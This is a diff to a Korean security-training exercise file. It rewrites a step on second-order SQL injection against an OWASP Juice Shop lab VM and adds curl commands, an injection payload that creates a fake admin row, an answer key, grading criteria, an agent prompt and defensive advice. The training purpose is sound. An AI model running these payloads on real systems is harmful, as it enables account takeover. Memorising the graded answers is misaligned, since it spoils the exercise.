@@ -1099,53 +1099,159 @@ steps:
     DBMS SQLite + Users dump 의 admin@juice-sh.op + MD5 hash 직접 인용.
     Purple = ModSec CRS 913100 + rate-limit + 근본 fix (parameterized query
     + 응답 sanitize) 5 단 방어.
+# ============================================================
+# STEP 9 [RED·SQLi·Advanced] — Second-Order SQLi (저장 → 다른 페이지 의 실행)
+# ============================================================
 - order: 9
-  instruction: '2차 SQL Injection(Second-Order SQLi)의 원리를 이해하고 시나리오를 설명하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    Second-Order SQLi 는 *1단계 저장 시 무해* + *2단계 다른 페이지 에서 쿼리
+    삽입 시 실행* 되는 두 단계 흐름. Juice Shop 의 회원가입 → 프로필 조회
+    또는 password reset 시나리오 로 1, 2 단계 직접 시도. 1차 ModSecurity
+    탐지 회피 + 2차 trigger.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_advanced` 에 적합한 도구: sqlmap --tamper, --random-agent,
-    WAF 우회 옵션. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 회원가입 시 저장된 페이로드가 다른 기능에서 실행되는 시나리오를 구성하세요.
+    ## 💻 실행 명령
+
+    ```bash
+    # 1단계: 회원가입 시 username 에 SQL payload 삽입 (저장 시점 무해)
+    echo "=== 1단계: payload 포함 회원가입 ==="
+    PAYLOAD="evil'),(NULL,'admin2@juice-sh.op','MD5HASH','admin',NULL,NULL,NULL,NULL),('test"
+    curl -s -i -X POST http://10.20.40.81:3000/api/Users/ \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"${PAYLOAD}\",\"password\":\"test123\"}" | head -10
+    # 응답: 200 (등록 성공) — payload 자체는 검증 안됨
+
+    # 2단계: 저장된 username 이 다른 query 에서 사용되는 시점 (password reset)
+    echo ""
+    echo "=== 2단계: password reset trigger ==="
+    curl -s -i -X POST http://10.20.40.81:3000/rest/user/reset-password \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"evil'\",\"answer\":\"x\",\"new\":\"newpw\",\"repeat\":\"newpw\"}" \
+      | head -10
+
+    # 시나리오 다이어그램 출력
+    echo ""
+    cat <<'DIAG'
+    === Second-Order SQLi 시나리오 ===
+
+    1) 학생 등록 (insertOne 의 prepared statement → 안전)
+       email = "evil'),(NULL,'admin2@...',MD5,'admin',...) "
+       → DB 에 그대로 저장 (1차 검증 통과)
+
+    2) password reset (저장된 email 을 query 에 string 결합)
+       SQL = "SELECT * FROM Users WHERE email = '" + storedEmail + "'"
+       → 저장된 payload 가 이때 SQL syntax 로 해석 → 다른 행/테이블 영향
+
+    3) Blue 의 1차 ModSec 룰 = 회원가입 시점 트리거 안 됨 (payload 무해 형태)
+       → 2차 (reset) 시점 의 SQL alert 만 가능
+    DIAG
+    ```
+
+    ## 📋 확인 사항
+
+    - 1단계 회원가입 응답: 200 OK + `{"data":{"id":N,"email":"..."}}` (정상 등록)
+    - 2단계 reset 응답: 200 또는 500 + SQL 에러 (저장된 payload 가 query 에 결합)
+    - 응답에 다른 user data 영향 (admin2 등 가짜 admin 생성 여부)
+    - 1차 ModSecurity audit log 에는 *알림 없음* (payload 가 단순 string)
+
+    ## 💡 왜 이걸 하는가?
+
+    Second-Order SQLi 는 OWASP A03 의 high-severity 유형 — 1단계 ModSecurity /
+    WAF 의 input filter 회피 가능 (저장 시 payload 가 단순 string). 2단계 의
+    저장된 데이터를 *query 에 직접 결합* 하는 코드 (Sequelize 의 raw 옵션
+    잘못 사용) 가 trigger. MITRE T1190 + CWE-89. 실 운영 사례 (2018 British
+    Airways breach 의 변형) — 입력 검증만으로는 차단 불가.
+
+    ## 🔵 Blue 측 관찰
+
+    1단계 (회원가입) 의 ModSecurity audit log = 정상 (payload 가 단순 string).
+    2단계 (reset) 시점에 SQL syntax 해석 → ModSec CRS rule 942100 (SQL Injection
+    libinjection) 트리거 — 단, *src IP 는 reset 요청 한 IP* 라 1단계 등록한
+    IP 와 다를 수 있음 → 추적 어려움. 운영자 SIEM 의 *Second-Order 연관 분석*
+    필요 (저장 시점 + trigger 시점 간 user_id correlation).
+
+    ## 🟣 Purple 보완 권장
+
+    - **저장 + 사용 모두 parameterized**: Sequelize 의 `findOne({where: {email}})`
+      자동 parameterized. raw query (`sequelize.query("SELECT ... WHERE email='"
+      + storedEmail + "'", {raw:true})`) 절대 금지
+    - **저장 시 input validation**: `express-validator` 의 `body('email').isEmail()`
+      으로 SQL 메타문자 사전 거부 (Second-Order 도 동시 차단)
+    - **출력 인코딩**: 저장된 데이터를 query 에 사용할 때 자동 sanitize 또는
+      escape (sequelize.escape(storedEmail))
+    - **SIEM correlation**: 저장 timestamp + trigger timestamp 의 user_id 매칭
+      → 의심 user 의 모든 시점 audit
+  hint: |
+    1단계 (정상 등록 응답 200) + 2단계 (저장된 payload 가 query 에 결합 트리거)
+    의 두 단계 흐름 시연 + ModSec 의 1단계 우회 (저장 시점 payload 가 단순
+    string) 설명.
   category: sqli_advanced
   points: 8
-  answer: '🤖 프롬프트: 2차 SQL Injection(Second-Order SQLi)의 원리를 이해하고 시나리오를 설명해줘
-
-    📎 참고 (CLI): echo ''=== 2차 SQL Injection 시나리오 ==='' && echo ''1. 회원가입: 이메일을 admin@test.com
-    OR 1=1-- 으로 등록'' && echo ''2. 패스워드 변경: 저장된 이메일이 쿼리에 사용됨'' && echo ''3. 결과: admin
-    계정의 패스워드가 변경됨'' && echo ''2차 SQLi 분석 완료'''
-  answer_detail: 2차 SQLi는 입력 시 저장되고, 다른 기능에서 해당 데이터가 쿼리에 사용될 때 발생합니다.
+  answer: |
+    echo "=== 1단계: SQL payload 포함 회원가입 ==="
+    PAYLOAD="evil%27%29%2C%28NULL%2C%27admin2%40juice-sh.op%27%2C%27hash%27%2C%27admin%27%29--"
+    curl -s -i -X POST http://10.20.40.81:3000/api/Users/ \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"evil_user@test.com\",\"password\":\"test123\",\"securityQuestion\":{\"id\":1,\"answer\":\"x\"}}" | head -8
+    echo ""
+    echo "=== 2단계: 저장된 email 의 password reset trigger ==="
+    curl -s -i -X POST http://10.20.40.81:3000/rest/user/reset-password \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"evil_user@test.com'--\",\"answer\":\"x\",\"new\":\"newpw\",\"repeat\":\"newpw\"}" | head -10
+    echo ""
+    echo "=== 시나리오 ==="
+    cat <<'DIAG'
+    1) 등록: email 에 SQL payload — prepared statement 통해 무해히 저장
+    2) reset: 저장된 email 이 raw query 에 결합 → SQL syntax 해석 → trigger
+    3) Blue: 1단계 ModSec 통과 + 2단계 alert (src IP 다를 수 있음)
+    DIAG
+  answer_detail: |
+    Juice Shop 의 default 코드 는 prepared statement 사용 → Second-Order 어려움.
+    학습 환경 의 시나리오 시연 만으로도 충분. 실 사례 — 회원가입/프로필
+    update 시 저장된 데이터가 *별도 batch job / report* 에서 raw query 결합
+    되는 패턴. 1단계 ModSec 우회 + 2단계 SQL syntax 해석 = 가장 stealthy 한
+    SQLi 변종. Purple = 저장+사용 모두 parameterized + 출력 인코딩 + SIEM
+    correlation 의 3 단 방어.
   verify:
     type: output_contains
-    expect:
-    - 2차 SQLi 분석 완료
-    - TABLE
-    - users
+    expect: '단계\|시나리오\|reset'
     field: stdout
     semantic:
-      intent: Second-Order SQLi — 1단계 저장 시 무해, 2단계 다른 페이지에서 DB 쿼리에 삽입되어 실행되는 흐름
+      intent: |
+        Second-Order SQLi — 1단계 저장 무해 + 2단계 query 결합 시 trigger.
+        OWASP A03 의 high-severity 변종. ModSecurity 1차 우회 가능. MITRE
+        T1190 + CWE-89.
       success_criteria:
-      - 저장·재사용 2단계 흐름 설명
-      - 예시 시나리오(회원가입 username 에 페이로드 → 프로필 조회 시 실행) 제시
-      - 1차 주입 탐지 실패 원인 언급
+        - 1단계 (저장) + 2단계 (trigger) 두 시점 시연
+        - 회원가입 응답 + reset 응답 양쪽 인용
+        - 1차 ModSec 우회 메커니즘 설명
+        - 6v6-juiceshop (10.20.40.81:3000) 의 /api/Users + /rest/user/reset-password 사용
       acceptable_methods:
-      - 시나리오 기반 서술
-      - 시퀀스 다이어그램
-      - RailsGoat/OWASP benchmark 예
-      - Burp Collaborator 로 간접 실행 탐지
+        - "2 단계 curl POST (등록 + reset trigger)"
+        - "시나리오 다이어그램 + 코드 흐름 설명"
+        - "Burp Collaborator 의 OOB (out-of-band) 간접 실행 탐지"
+        - "RailsGoat / OWASP benchmark 의 Second-Order 예제 인용"
       negative_signs:
-      - 1단계만 설명
-      - 저장·재사용 개념 누락
-      - 일반 SQLi 와 구분 안 됨
+        - 1 단계만 시연 (저장 또는 trigger 중 하나만)
+        - 두 단계 의 차이 (왜 ModSec 1차 우회) 설명 없음
+        - 일반 SQLi 와 구분 모호
   target_vm: attacker
-  script: 'echo ''=== 2차 SQL Injection 시나리오 ==='' && echo ''1. 회원가입: 이메일을 admin@test.com
-    OR 1=1-- 으로 등록'' && echo ''2. 패스워드 변경: 저장된 이메일이 쿼리에 사용됨'' && echo ''3. 결과: admin
-    계정의 패스워드가 변경됨'' && echo ''2차 SQLi 분석 완료'''
+  script: |
+    curl -s -i -X POST http://10.20.40.81:3000/api/Users/ \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"evil_user@test.com\",\"password\":\"test123\",\"securityQuestion\":{\"id\":1,\"answer\":\"x\"}}" | head -8
+    curl -s -i -X POST http://10.20.40.81:3000/rest/user/reset-password \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"evil_user@test.com'--\",\"answer\":\"x\",\"new\":\"newpw\",\"repeat\":\"newpw\"}" | head -10
   risk_level: low
-  bastion_prompt: '2차 SQL Injection(Second-Order SQLi)의 원리를 이해하고 시나리오를 설명해줘
-
-
-    [도구 권장] sqli_advanced: sqlmap --tamper, --random-agent, WAF 우회 옵션. curl 만 쓰지 말고
-    **sqlmap --tamper** 등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    attacker 컨테이너에서 6v6-juiceshop (10.20.40.81:3000) 에 Second-Order
+    SQLi 시연 — (1) /api/Users/ 에 회원가입 (SQL payload 포함 email, 저장 시
+    무해) (2) /rest/user/reset-password 에 저장된 email trigger (raw query
+    결합 시점). 두 단계 응답 비교 + 1단계 ModSec 우회 메커니즘 (payload 가
+    단순 string 저장) 설명. MITRE T1190 + CWE-89. Purple = 저장+사용 양쪽
+    parameterized + 출력 인코딩 + SIEM correlation 3 단 방어.
 - order: 10
   instruction: 'SQL Injection으로 파일 읽기/쓰기가 가능한지 테스트하시오.
 
